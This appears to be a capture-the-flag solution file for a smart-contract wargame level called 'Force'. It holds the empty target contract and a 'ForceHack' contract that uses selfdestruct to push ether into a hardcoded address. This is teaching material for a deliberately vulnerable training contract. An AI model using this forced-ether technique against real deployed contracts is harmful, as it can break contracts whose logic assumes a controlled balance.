// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

/*
Some contracts will simply not take your money ¯\_(ツ)_/¯

The goal of this level is to make the balance of the contract greater than zero.

Things that might help:
- Fallback methods
- Sometimes the best way to attack a contract is with another contract.
- See the Help page above, section "Beyond the console"
*/

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}

pragma solidity ^0.8.0;

contract ForceHack {
    constructor() payable {
        require(msg.value > 0);
        self();
    }

    function self() public {
        address payable to = payable(0x2bEBb4467818216b8E58B42f287dA3db27a8A3a6);
        selfdestruct(to);
    }
}